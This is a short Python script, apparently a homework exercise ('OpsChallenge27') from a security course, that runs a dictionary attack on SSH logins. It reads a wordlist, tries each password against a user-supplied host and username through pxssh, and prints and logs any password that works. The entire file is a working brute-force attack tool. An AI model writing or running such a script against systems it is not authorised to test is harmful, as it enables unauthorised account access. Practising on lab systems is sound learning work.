#!/usr/bin/env python3
###########################
# Title: OpsChallenge27
# Author:Jeff Snyder
# Date: 10NOV2020
# Purpose: Dictionary attack against SSH connection
###########################
import smtplib
import itertools
import sys
import time
from pexpect import pxssh
import logging
from logging.handlers import RotatingFileHandler

# logging.basicConfig(filename="passwordreport.txt", level=logging.INFO)


    



def cracker(user, ipAddress, txtFile ):
    logger=logging.getLogger("Rotating Log")
    logger.setLevel(logging.INFO)
    handler = RotatingFileHandler("passwordreport.txt", maxBytes=100, backupCount=5)
    logger.addHandler(handler)
    filepath =open(txtFile)
    for i in filepath.readlines():
        secret=i.strip("\n")
        print(secret)
        s=pxssh.pxssh()
        try:
            s.login(ipAddress, user, secret)
            print("The password is  "+ secret)
            logger.info("The password is "+ secret)
            break    
        except pxssh.ExceptionPxssh as e:
            logger.info(e)
            print ("pxssh failed to login")
            print(e)
            time.sleep(.5)
    logger.info('Finished cracking')       
def main():
    
    print("Shall we play a game?")
    user=input("What is the username for the SSH connection?")
    ipAddress=input("What is the ip address of the target system?")
    txtFile=input("What is the folder path to your dictionary file?")
    cracker(user, ipAddress, txtFile)  
main()